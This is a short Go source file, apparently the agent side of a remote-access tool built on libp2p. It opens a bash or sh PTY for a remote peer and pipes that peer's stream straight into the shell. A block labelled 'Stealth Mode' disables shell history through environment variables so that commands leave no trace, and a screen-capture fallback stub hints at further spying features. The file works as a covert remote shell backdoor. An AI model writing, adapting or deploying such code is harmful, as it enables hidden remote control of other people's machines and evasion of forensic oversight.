//go:build !windows && !controller
// +build !windows,!controller

package main

import (
	"io"
	"os"
	"os/exec"
	"fmt"


	"github.com/creack/pty"
	"github.com/libp2p/go-libp2p/core/network"
)

func handleShellStream(s network.Stream) {
	defer s.Close()

	// Linux/Mac: Use PTY
	cmd := exec.Command("/bin/bash")
	// Fallback to sh if bash not found (though unlikely on modern systems)
	if _, err := exec.LookPath("/bin/bash"); err != nil {
		cmd = exec.Command("/bin/sh")
	}

	// Start with PTY
	// Stealth Mode: Inject environment variables to disable history
	cmd.Env = append(os.Environ(),
		"HISTFILE=/dev/null",
		"HISTSIZE=0",
		"HISTFILESIZE=0",
		"HISTSAVE=",
		"HISTZONE=",
		"HISTORY_IGNORE=*",
	)

	ptmx, err := pty.Start(cmd)
	if err != nil {
		s.Write([]byte("Error starting PTY: " + err.Error()))
		return
	}
	defer func() { _ = ptmx.Close() }()

	// Copy stdin to PTY
	go func() {
		io.Copy(ptmx, s)
	}()

	// Copy PTY to stdout
	io.Copy(s, ptmx)
	
	cmd.Wait()
}

func captureScreenFallback() ([]byte, error) {
	return nil, fmt.Errorf("no fallback available for unix")
}
